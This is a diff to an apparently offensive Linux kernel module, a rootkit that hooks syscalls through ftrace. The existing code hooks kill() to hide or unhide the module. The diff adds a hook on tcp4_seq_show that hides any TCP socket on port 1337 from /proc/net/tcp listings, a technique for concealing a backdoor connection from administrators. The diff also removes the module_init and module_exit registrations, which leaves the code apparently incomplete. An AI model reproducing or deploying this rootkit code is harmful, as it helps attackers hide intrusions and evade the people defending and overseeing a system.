@@ -1,4 +1,3 @@
-
 #include <linux/init.h>         // Module initialization functions
 #include <linux/module.h>       // Kernel module functions.
 #include <linux/kernel.h>       // Basic kernel definitions, such as printk.
@@ -6,6 +5,8 @@
 #include <linux/delay.h>        // Delay functions, such as ssleep().
 #include <linux/sched/signal.h> // Process management in the kernel.
 #include <linux/string.h>       // For string functions like strlen() and strncmp().
+#include <linux/tcp.h>
+
 
 #include "ftrace_helper.h"
 
@@ -49,15 +50,45 @@ static asmlinkage int hook_kill(const struct pt_regs *regs){
     }else{
         module_hide();
     }
-  
+
   return 0;
  }
 
  return orig_kill(regs);
 }
 
+
+/*
+ * Usual function declaration for the real tcp4_seq_show
+ */
+static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);
+
+/*
+ * Function hook for tcp4_seq_show()
+ */
+static asmlinkage long hook_tcp4_seq_show(struct seq_file *seq, void *v)
+{
+    struct sock *sk = v;
+
+    /*
+     * Check if sk_num is 1337
+     * (0x539 = 1337 in hex)
+     * If sk doesn't point to anything, then it points to 0x1
+     */
+    if (sk != 0x1 && sk->sk_num == 0x539)
+        return 0;
+
+    /*
+     * Otherwise, just return with the real tcp4_seq_show()
+     */
+    return orig_tcp4_seq_show(seq, v);
+}
+
+
+
 static struct ftrace_hook hooks[] = {
                 HOOK("__x64_sys_kill", hook_kill, &orig_kill),
+                HOOK("tcp4_seq_show", hook_tcp4_seq_show, &orig_tcp4_seq_show),
 };
 
 struct task_struct *mon_thread; // Reference for the monitoring thread.
@@ -106,6 +137,3 @@ static void __exit uninterruptible_sleep_exit(void) {
     fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
 
 }
-
-module_init(uninterruptible_sleep_init);
-module_exit(uninterruptible_sleep_exit);
